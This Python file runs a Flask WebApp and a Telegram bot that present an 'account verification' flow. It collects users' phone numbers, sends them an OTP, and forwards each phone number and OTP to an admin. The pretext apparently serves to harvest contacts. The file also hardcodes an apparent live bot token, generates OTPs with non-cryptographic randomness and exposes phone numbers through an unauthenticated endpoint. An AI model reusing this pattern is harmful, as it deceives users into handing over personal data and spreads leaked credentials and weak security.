import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify
import logging
from datetime import datetime
import threading
import time
import json
import random
import uuid
from flask_cors import CORS

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)  # Enable CORS for WebApp
app.secret_key = os.environ.get("SECRET_KEY", "telegram-webapp-secret-key-2024")

# Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://itz-me-545-telegram.onrender.com")
ADMIN_ID = os.environ.get("ADMIN_ID")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# Get bot info
try:
    bot_info = bot.get_me()
    BOT_USERNAME = bot_info.username
    BOT_NAME = bot_info.first_name
    logger.info(f"🤖 Bot initialized: {BOT_NAME} (@{BOT_USERNAME})")
except Exception as e:
    logger.error(f"Failed to get bot info: {e}")
    BOT_USERNAME = "your_bot"
    BOT_NAME = "Verification Bot"

# Session storage
sessions = {}  # {session_id: session_data}
session_timeout = 600  # 10 minutes

# ==================== SESSION MANAGEMENT ====================
def create_session(user_id, telegram_data=None):
    """Create a new session"""
    session_id = str(uuid.uuid4())
    
    sessions[session_id] = {
        'session_id': session_id,
        'user_id': user_id,
        'telegram_data': telegram_data,
        'created': datetime.now(),
        'status': 'active',
        'phone': None,
        'otp_code': None,
        'otp_sent': False,
        'otp_verified': False,
        'verification_step': 'start',
        'last_activity': datetime.now()
    }
    
    logger.info(f"✅ Created session {session_id} for user {user_id}")
    return session_id

def get_session(session_id):
    """Get session by ID"""
    if session_id in sessions:
        session = sessions[session_id]
        
        # Check expiration
        time_diff = (datetime.now() - session['created']).total_seconds()
        if time_diff > session_timeout:
            logger.info(f"🗑️ Session expired: {session_id}")
            del sessions[session_id]
            return None
        
        # Update last activity
        session['last_activity'] = datetime.now()
        return session
    
    return None

def get_session_by_user(user_id):
    """Get session by user ID"""
    for session_id, session in sessions.items():
        if str(session['user_id']) == str(user_id):
            return session
    return None

def update_session(session_id, updates):
    """Update session data"""
    if session_id in sessions:
        sessions[session_id].update(updates)
        sessions[session_id]['last_activity'] = datetime.now()
        return True
    return False

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main page"""
    return render_template('index.html',
                         bot_username=BOT_USERNAME,
                         webapp_url=WEBAPP_URL)

@app.route('/verify')
def verify_page():
    """Verification page"""
    user_id = request.args.get('user_id')
    
    if not user_id:
        return render_template('error.html',
                             error="User ID Required",
                             message="Please open from Telegram bot",
                             bot_username=BOT_USERNAME)
    
    # Check if user already has active session
    existing_session = get_session_by_user(user_id)
    if existing_session:
        session_id = existing_session['session_id']
    else:
        # Create new session
        session_id = create_session(user_id)
    
    return render_template('verify.html',
                         session_id=session_id,
                         user_id=user_id,
                         bot_username=BOT_USERNAME)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    session_id = request.args.get('session_id')
    
    if not session_id:
        return render_template('error.html',
                             error="Session Required",
                             message="Please share contact first",
                             bot_username=BOT_USERNAME)
    
    session = get_session(session_id)
    if not session or not session.get('otp_sent'):
        return render_template('error.html',
                             error="Invalid Session",
                             message="Please share contact first",
                             bot_username=BOT_USERNAME)
    
    phone = session.get('phone', 'Unknown')
    masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else phone
    
    return render_template('otp.html',
                         session_id=session_id,
                         phone=masked_phone,
                         bot_username=BOT_USERNAME)

@app.route('/success')
def success_page():
    """Success page"""
    session_id = request.args.get('session_id')
    
    if session_id:
        session = get_session(session_id)
        if session and session.get('otp_verified'):
            return render_template('success.html',
                                 phone=session.get('phone'),
                                 bot_username=BOT_USERNAME)
    
    return render_template('error.html',
                         error="Verification Required",
                         message="Please complete verification",
                         bot_username=BOT_USERNAME)

# ==================== API ENDPOINTS ====================
@app.route('/api/verify-contact', methods=['POST'])
def api_verify_contact():
    """Process contact from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        
        logger.info(f"📱 Processing contact: session={session_id}, phone={phone}")
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        # Get session
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # Normalize phone number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Generate OTP
        otp_code = str(random.randint(100000, 999999))
        
        # Update session
        update_session(session_id, {
            'phone': phone,
            'otp_code': otp_code,
            'otp_sent': True,
            'status': 'otp_sent',
            'verification_step': 'otp_pending',
            'otp_sent_at': datetime.now().isoformat()
        })
        
        # Send OTP (in production, use SMS API)
        logger.info(f"📨 Sending OTP {otp_code} to {phone}")
        
        # Send OTP via Telegram to user
        try:
            user_id = session.get('user_id')
            if user_id:
                otp_message = f"""🔐 <b>Your Verification Code</b>

Your OTP code is: <code>{otp_code}</code>

This code will expire in 10 minutes.

⚠️ <i>Do not share this code with anyone.</i>"""
                
                bot.send_message(int(user_id), otp_message, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Failed to send Telegram OTP: {e}")
        
        # Notify admin
        if ADMIN_ID:
            try:
                admin_msg = f"""📞 <b>NEW VERIFICATION STARTED</b>

🆔 User ID: <code>{session['user_id']}</code>
📱 Phone: {phone}
🔢 OTP: {otp_code}
🌐 Source: WebApp
⏰ Time: {datetime.now().strftime('%H:%M:%S')}"""
                
                bot.send_message(int(ADMIN_ID), admin_msg, parse_mode='HTML')
            except Exception as e:
                logger.error(f"Admin notification failed: {e}")
        
        return jsonify({
            'success': True,
            'message': 'OTP sent successfully',
            'redirect': f'/otp?session_id={session_id}'
        })
        
    except Exception as e:
        logger.error(f"Error processing contact: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP"""
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        if not otp or len(otp) != 6:
            return jsonify({'success': False, 'error': 'Invalid OTP format (6 digits required)'})
        
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not session.get('otp_sent'):
            return jsonify({'success': False, 'error': 'OTP not sent yet'})
        
        # Verify OTP
        if session.get('otp_code') == otp:
            # Mark as verified
            update_session(session_id, {
                'otp_verified': True,
                'status': 'verified',
                'verification_step': 'completed',
                'verified_at': datetime.now().isoformat()
            })
            
            # Send success message to user
            try:
                user_id = session.get('user_id')
                if user_id:
                    success_msg = f"""✅ <b>VERIFICATION SUCCESSFUL</b>

Your account has been verified successfully!

📱 Phone: {session.get('phone')}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}

Thank you for verifying your account!"""
                    
                    bot.send_message(int(user_id), success_msg, parse_mode='HTML')
            except Exception as e:
                logger.error(f"User notification failed: {e}")
            
            # Notify admin
            if ADMIN_ID:
                try:
                    admin_msg = f"""✅ <b>VERIFICATION COMPLETED</b>

🆔 User ID: <code>{session['user_id']}</code>
📱 Phone: {session.get('phone')}
🔢 OTP: {otp}
✅ Status: Verified
⏰ Time: {datetime.now().strftime('%H:%M:%S')}"""
                    
                    bot.send_message(int(ADMIN_ID), admin_msg, parse_mode='HTML')
                except Exception as e:
                    logger.error(f"Admin notification failed: {e}")
            
            return jsonify({
                'success': True,
                'message': 'OTP verified successfully!',
                'redirect': f'/success?session_id={session_id}'
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Invalid OTP code'
            })
        
    except Exception as e:
        logger.error(f"Error verifying OTP: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/resend-otp', methods=['POST'])
def api_resend_otp():
    """Resend OTP"""
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        phone = session.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number not found'})
        
        # Generate new OTP
        new_otp = str(random.randint(100000, 999999))
        
        # Update session
        update_session(session_id, {
            'otp_code': new_otp,
            'otp_sent_at': datetime.now().isoformat()
        })
        
        # Send OTP
        logger.info(f"🔄 Resending OTP {new_otp} to {phone}")
        
        # Send via Telegram
        try:
            user_id = session.get('user_id')
            if user_id:
                otp_message = f"""🔄 <b>New Verification Code</b>

Your new OTP code is: <code>{new_otp}</code>

This code will expire in 10 minutes."""
                
                bot.send_message(int(user_id), otp_message, parse_mode='HTML')
        except:
            pass
        
        return jsonify({
            'success': True,
            'message': 'New OTP sent successfully'
        })
        
    except Exception as e:
        logger.error(f"Error resending OTP: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/session-status/<session_id>', methods=['GET'])
def api_session_status(session_id):
    """Get session status"""
    session = get_session(session_id)
    if session:
        return jsonify({
            'success': True,
            'session': {
                'session_id': session_id,
                'user_id': session.get('user_id'),
                'status': session.get('status'),
                'phone': session.get('phone'),
                'otp_sent': session.get('otp_sent', False),
                'otp_verified': session.get('otp_verified', False)
            }
        })
    return jsonify({'success': False, 'error': 'Session not found'})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        first_name = message.from_user.first_name or ""
        username = message.from_user.username or ""
        
        logger.info(f"📨 /start from {user_id} (@{username})")
        
        # Create WebApp URL
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/verify?user_id={user_id}"
        
        # Create WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Welcome message
        welcome_text = f"""<b>🔐 Telegram Account Verification</b>

Hello {first_name}! 👋

Click the button below to open the WebApp and verify your Telegram account.

<b>How it works:</b>
1. Open WebApp
2. Share your contact in WebApp
3. Receive OTP on Telegram
4. Enter OTP in WebApp
5. Verification complete! ✅

⚠️ <b>Important:</b> Your contact information is secure.

<b>Bot:</b> @{BOT_USERNAME}"""
        
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ WebApp button sent to {user_id}")
        
    except Exception as e:
        logger.error(f"❌ Error in /start: {e}")
        bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try /start again.")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact shared directly to bot (fallback)"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        
        if not message.contact:
            bot.send_message(chat_id, "⚠️ Please share a valid contact.")
            return
        
        contact = message.contact
        phone = contact.phone_number
        
        logger.info(f"📞 Direct contact from {user_id}: {phone}")
        
        # Normalize phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Find session for this user
        session = get_session_by_user(user_id)
        
        if not session:
            # Create new session
            session_id = create_session(user_id)
            session = get_session(session_id)
        
        # Process contact via API
        import requests
        try:
            response = requests.post(
                f"{WEBAPP_URL.rstrip('/')}/api/verify-contact",
                json={
                    "session_id": session['session_id'],
                    "phone": phone
                },
                timeout=10
            ).json()
            
            if response.get('success'):
                # Delete contact message for privacy
                try:
                    bot.delete_message(chat_id, message.message_id)
                except:
                    pass
                
                # Send OTP message
                otp_message = f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}

📨 OTP has been sent to your Telegram.

Click here to enter OTP:
{WEBAPP_URL.rstrip('/')}/otp?session_id={session['session_id']}

Or open the WebApp to continue."""
                
                bot.send_message(
                    chat_id,
                    otp_message,
                    parse_mode='HTML',
                    disable_web_page_preview=True
                )
                
                logger.info(f"✅ Contact processed for {user_id}")
            else:
                bot.send_message(
                    chat_id,
                    f"❌ Error: {response.get('error', 'Failed to process contact')}"
                )
                
        except Exception as e:
            logger.error(f"API call failed: {e}")
            bot.send_message(chat_id, "⚠️ Server error. Please try again.")
        
    except Exception as e:
        logger.error(f"❌ Error handling contact: {e}")
        bot.send_message(message.chat.id, "⚠️ Error processing contact.")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle other messages"""
    try:
        text = message.text or ""
        
        if text.startswith('/'):
            return
        
        # Help response
        help_text = f"""<b>📋 How to verify:</b>

1. Send /start to get WebApp link
2. Open WebApp and share contact
3. Receive OTP on Telegram
4. Enter OTP in WebApp

<b>Bot:</b> @{BOT_USERNAME}"""
        
        bot.send_message(message.chat.id, help_text, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Error handling message: {e}")

# ==================== BOT POLLING ====================
def bot_polling():
    """Start bot polling"""
    logger.info("🤖 Starting bot polling...")
    
    while True:
        try:
            bot.polling(
                none_stop=True,
                interval=1,
                timeout=30,
                long_polling_timeout=30
            )
        except Exception as e:
            logger.error(f"❌ Bot polling error: {e}")
            logger.info("🔄 Restarting bot in 5 seconds...")
            time.sleep(5)

# ==================== CLEANUP THREAD ====================
def cleanup_sessions():
    """Clean up expired sessions"""
    while True:
        try:
            current_time = datetime.now()
            expired_sessions = []
            
            for session_id, session in sessions.items():
                time_diff = (current_time - session['created']).total_seconds()
                if time_diff > session_timeout:
                    expired_sessions.append(session_id)
            
            for session_id in expired_sessions:
                del sessions[session_id]
                logger.info(f"🧹 Cleaned expired session: {session_id}")
            
            time.sleep(60)
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            time.sleep(60)

# ==================== MAIN ====================
if __name__ == '__main__':
    # Startup info
    logger.info("="*50)
    logger.info("🚀 TELEGRAM WEBAPP VERIFICATION BOT")
    logger.info("="*50)
    logger.info(f"🤖 Bot: @{BOT_USERNAME}")
    logger.info(f"🌐 WebApp: {WEBAPP_URL}")
    logger.info(f"👑 Admin: {ADMIN_ID or 'Not set'}")
    logger.info("="*50)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Start bot polling
    bot_thread = threading.Thread(target=bot_polling, daemon=True)
    bot_thread.start()
    logger.info("✅ Bot polling started")
    
    # Run Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Flask starting on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
                          )
